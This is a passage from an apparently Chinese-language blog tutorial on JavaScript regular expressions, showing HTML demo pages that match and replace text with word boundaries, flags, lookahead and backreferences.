class="attr">value</span>=<span class="string">"匹配输入的名字是不是lisi"</span> <span class="attr">onclick</span>=<span class="string">"t7();"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">            <span class="function"><span class="keyword">function</span> <span class="title">t1</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cont = <span class="built_in">document</span>.getElementById(<span class="string">'cont'</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cv = cont.value;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> reg = <span class="regexp">/hi/</span>;<span class="comment">//仅仅是看字符串中有没有hi</span></span></span><br><span class="line"><span class="javascript">            alert(reg.test(cv));<span class="comment">//满足 返回true  不满足 返回false</span></span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="javascript">            <span class="function"><span class="keyword">function</span> <span class="title">t2</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cont = <span class="built_in">document</span>.getElementById(<span class="string">'cont'</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cv = cont.value;</span></span><br><span class="line"><span class="javascript">            <span class="comment">//var reg = /\bhi.+/;// 错误1 匹配hi开头的单词</span></span></span><br><span class="line"><span class="javascript">            <span class="comment">////var reg = /\bhi\w+/;// 错误2</span></span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> reg = <span class="regexp">/\bhi\w*/</span>; </span></span><br><span class="line"><span class="javascript">            alert(reg.exec(cv));<span class="comment">//exec返回一个对象  没找到返回none</span></span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="javascript">            <span class="function"><span class="keyword">function</span> <span class="title">t3</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cont = <span class="built_in">document</span>.getElementById(<span class="string">'cont'</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cv = cont.value;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> reg = <span class="regexp">/\bhi/</span>;<span class="comment">//正则测试hi开头的单词但不是hi</span></span></span><br><span class="line"><span class="javascript">            alert(reg.exec(cv));<span class="comment">//exec返回一个对象  没找到返回none</span></span></span><br><span class="line"><span class="undefined">            &#125; </span></span><br><span class="line"><span class="javascript">            <span class="function"><span class="keyword">function</span> <span class="title">t4</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cont = <span class="built_in">document</span>.getElementById(<span class="string">'cont'</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cv = cont.value;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> reg = <span class="regexp">/\b[\w]+ing\b/</span>;<span class="comment">//*表示匹配0-无穷  +表示匹配1-无穷</span></span></span><br><span class="line"><span class="undefined">            alert(reg.exec(cv));</span></span><br><span class="line"><span class="undefined">            &#125; </span></span><br><span class="line"><span class="javascript">            <span class="function"><span class="keyword">function</span> <span class="title">t5</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cont = <span class="built_in">document</span>.getElementById(<span class="string">'cont'</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cv = cont.value;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> reg = <span class="regexp">/\bun[\w]+\b/</span>;<span class="comment">//匹配un前缀的反义词</span></span></span><br><span class="line"><span class="undefined">            alert(reg.exec(cv));</span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="javascript">            <span class="function"><span class="keyword">function</span> <span class="title">t6</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cont = <span class="built_in">document</span>.getElementById(<span class="string">'cont'</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cv = cont.value;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> reg = <span class="regexp">/\Bhi\B/</span>;<span class="comment">//匹配单词中间的hi部分</span></span></span><br><span class="line"><span class="undefined">            alert(reg.exec(cv));</span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="javascript">            <span class="function"><span class="keyword">function</span> <span class="title">t7</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cont = <span class="built_in">document</span>.getElementById(<span class="string">'cont'</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cv = cont.value;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> reg = <span class="regexp">/^lisi$/</span>;<span class="comment">//匹配输入的名字是不是lisi</span></span></span><br><span class="line"><span class="undefined">            alert(reg.exec(cv));</span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="4-4-例4-正则应用字符串"><a href="#4-4-例4-正则应用字符串" class="headerlink" title="4.4 例4 正则应用字符串"></a>4.4 例4 正则应用字符串</h3><blockquote><p>在线演示 <a href="https://codepen.io/poetries/pen/dmaOPz" target="_blank" rel="noopener">https://codepen.io/poetries/pen/dmaOPz</a></p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>正则应用字符串<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">"text/css"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">textarea&#123;</span></span><br><span class="line"><span class="undefined">width: 400px;</span></span><br><span class="line"><span class="undefined">height: 200px; </span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">textarea</span> <span class="attr">id</span>=<span class="string">'cont'</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"查找中间含有hi的单词"</span> <span class="attr">onclick</span>=<span class="string">"t1();"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"查找所有中间含有hi的单词"</span> <span class="attr">onclick</span>=<span class="string">"t2();"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"查找所有中间含有hi的单词，不区分大小写"</span> <span class="attr">onclick</span>=<span class="string">"t3();"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"替换JavaScript标签"</span> <span class="attr">onclick</span>=<span class="string">"t4();"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"把连接换成空连接"</span> <span class="attr">onclick</span>=<span class="string">"t5();"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"把每一行的结尾的数字换成#"</span> <span class="attr">onclick</span>=<span class="string">"t6();"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"替换goods中多余的O"</span> <span class="attr">onclick</span>=<span class="string">"t7();"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">            <span class="function"><span class="keyword">function</span> <span class="title">t1</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cont = <span class="built_in">document</span>.getElementById(<span class="string">'cont'</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cv = cont.value;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> reg = <span class="regexp">/\Bhi\B/</span>;<span class="comment">//查找中间含有hi的单词</span></span></span><br><span class="line"><span class="undefined">            alert(cv.match(reg));</span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="javascript">            <span class="function"><span class="keyword">function</span> <span class="title">t2</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cont = <span class="built_in">document</span>.getElementById(<span class="string">'cont'</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cv = cont.value;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> reg = <span class="regexp">/\Bhi\B/g</span>;<span class="comment">//查找所有中间含有hi的单词</span></span></span><br><span class="line"><span class="undefined">            alert(cv.match(reg));</span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="javascript">            <span class="function"><span class="keyword">function</span> <span class="title">t3</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cont = <span class="built_in">document</span>.getElementById(<span class="string">'cont'</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cv = cont.value;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> reg = <span class="regexp">/\Bhi\B/gi</span>;<span class="comment">//查找所有中间含有hi的单词  g是全局 i ignore 忽略大小写</span></span></span><br><span class="line"><span class="undefined">            alert(cv.match(reg));</span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="javascript">            <span class="function"><span class="keyword">function</span> <span class="title">t4</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cont = <span class="built_in">document</span>.getElementById(<span class="string">'cont'</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cv = cont.value;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span>  reg = <span class="regexp">/&lt;script.*&lt;\/script&gt;/</span>;<span class="comment">//替换JavaScript标签</span></span></span><br><span class="line"><span class="javascript">            alert(cv.replace(reg,<span class="string">'哈哈哈'</span>));</span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="javascript">            <span class="function"><span class="keyword">function</span> <span class="title">t5</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cont = <span class="built_in">document</span>.getElementById(<span class="string">'cont'</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cv = cont.value;</span></span><br><span class="line"><span class="undefined">              /*</span></span><br><span class="line"><span class="undefined">                        . 代表任意,但不包括换行</span></span><br><span class="line"><span class="undefined">                        可以用一对反义词来匹配所有. \d\D等</span></span><br><span class="line"><span class="undefined">                        不能跨行（贪婪模式）</span></span><br><span class="line"><span class="undefined">                  */</span></span><br><span class="line"><span class="undefined">                 </span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> reg = <span class="regexp">/&lt;a[\s]+[\d\D]*&lt;\/a&gt;/</span>; <span class="comment">//正则替换链接</span></span></span><br><span class="line"><span class="xml">                    alert(cv.replace(reg,'<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>文字<span class="tag">&lt;/<span class="name">a</span>&gt;</span>')); </span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="javascript">            <span class="function"><span class="keyword">function</span> <span class="title">t6</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cont = <span class="built_in">document</span>.getElementById(<span class="string">'cont'</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cv = cont.value;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span>  reg = <span class="regexp">/\d+$/gm</span>;<span class="comment">//把每一行的结尾的数字换成#   m 多行模式</span></span></span><br><span class="line"><span class="javascript">            alert(cv.replace(reg,<span class="string">'#'</span>));</span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="javascript">            <span class="function"><span class="keyword">function</span> <span class="title">t7</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cont = <span class="built_in">document</span>.getElementById(<span class="string">'cont'</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cv = cont.value;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span>  reg = <span class="regexp">/go&#123;3,&#125;?ds/</span>;<span class="comment">//替换goods中多余的O</span></span></span><br><span class="line"><span class="javascript">            alert(cv.replace(reg,<span class="string">'goods'</span>));</span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="4-5-例5-预查"><a href="#4-5-例5-预查" class="headerlink" title="4.5 例5-预查"></a>4.5 例5-预查</h3><blockquote><p>在线演示 <a href="https://codepen.io/poetries/pen/MVLbwW" target="_blank" rel="noopener">https://codepen.io/poetries/pen/MVLbwW</a></p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>预查<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">"text/css"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">textarea&#123;</span></span><br><span class="line"><span class="undefined">width: 400px;</span></span><br><span class="line"><span class="undefined">height: 200px; </span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">textarea</span> <span class="attr">id</span>=<span class="string">'cont'</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"匹配进行时的单词"</span> <span class="attr">onclick</span>=<span class="string">"t1();"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"匹配进行时的单词的词根部分,正向预查"</span> <span class="attr">onclick</span>=<span class="string">"t2();"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"查找winxp,负向预查"</span> <span class="attr">onclick</span>=<span class="string">"t3();"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"找出un*系列单词的词根"</span> <span class="attr">onclick</span>=<span class="string">"t4();"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">            <span class="function"><span class="keyword">function</span> <span class="title">t1</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cont = <span class="built_in">document</span>.getElementById(<span class="string">'cont'</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cv = cont.value;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> reg = <span class="regexp">/\b[\w]+ing\b/</span>;</span></span><br><span class="line"><span class="undefined">            alert(cv.match(reg));</span></span><br><span class="line"><span class="undefined">            &#125; </span></span><br><span class="line"><span class="javascript">            <span class="function"><span class="keyword">function</span> <span class="title">t2</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cont = <span class="built_in">document</span>.getElementById(<span class="string">'cont'</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cv = cont.value;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> reg = <span class="regexp">/\b[\w]+(?=ing)/g</span>;<span class="comment">//匹配进行时的单词的词根部分  不要ing结尾  预查不消耗字符</span></span></span><br><span class="line"><span class="undefined">            alert(cv.match(reg));</span></span><br><span class="line"><span class="undefined">            &#125; </span></span><br><span class="line"><span class="javascript">            <span class="function"><span class="keyword">function</span> <span class="title">t3</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cont = <span class="built_in">document</span>.getElementById(<span class="string">'cont'</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cv = cont.value;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> reg = <span class="regexp">/\bwin(?!95)/g</span>;<span class="comment">//win98 win97 win95 win32 winxp win2003要求把win95过滤</span></span></span><br><span class="line"><span class="undefined">            alert(cv.match(reg));</span></span><br><span class="line"><span class="undefined">            &#125; </span></span><br><span class="line"><span class="javascript">            <span class="function"><span class="keyword">function</span> <span class="title">t4</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cont = <span class="built_in">document</span>.getElementById(<span class="string">'cont'</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cv = cont.value;</span></span><br><span class="line"><span class="javascript">            <span class="comment">//var reg = /\w+(?&lt;=un)/g;//找出un*系列单词的词根  js不支持向前正向预查</span></span></span><br><span class="line"><span class="undefined">            alert(cv.match(reg));</span></span><br><span class="line"><span class="undefined">            &#125; </span></span><br><span class="line"><span class="undefined"> </span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="4-6-例6-反向引用"><a href="#4-6-例6-反向引用" class="headerlink" title="4.6 例6-反向引用"></a>4.6 例6-反向引用</h3><blockquote><p>在线演示 <a href="https://codepen.io/poetries/pen/LdqbVL" target="_blank" rel="noopener">https://codepen.io/poetries/pen/LdqbVL</a></p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>反向引用<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">"text/css"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">textarea&#123;</span></span><br><span class="line"><span class="undefined">width: 400px;</span></span><br><span class="line"><span class="undefined">height: 200px; </span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">textarea</span> <span class="attr">id</span>=<span class="string">'cont'</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"把连接换成空连接，保留文字"</span> <span class="attr">onclick</span>=<span class="string">"t1();"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">            <span class="function"><span class="keyword">function</span> <span class="title">t1</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cont = <span class="built_in">document</span>.getElementById(<span class="string">'cont'</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cv = cont.value;</span></span><br><span class="line"><span class="xml">            var reg = /<span class="tag">&lt;<span class="name">a[\s]+[^</span>&gt;</span>]+&gt;([^<span class="tag">&lt;&gt;</span>]+)<span class="tag">&lt;<span class="name">\</span>/<span class="attr">a</span>&gt;</span>/; //链接表达式  这个一部分是子表达式 ([^<span class="tag">&lt;&gt;</span>]+)</span></span><br><span class="line"><span class="javascript">                    <span class="comment">// alert(reg.exec(cv)); </span></span></span><br><span class="line"><span class="undefined">                    </span></span><br><span class="line"><span class="xml">                alert(cv.replace(reg,'<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>"&gt;</span>$1<span class="tag">&lt;/<span class="name">a</span>&gt;</span>'));</span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="4-7-例7-正则练习"><a href="#4-7-例7-正则练习" class="headerlink" title="4.7 例7-正则练习"></a>4.7 例7-正则练习</h3><blockquote><p>在线演示 <a href="https://codepen.io/poetries/pen/dmaOYV" target="_blank" rel="noopener">https://codepen.io/poetries/pen/dmaOYV</a></p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span 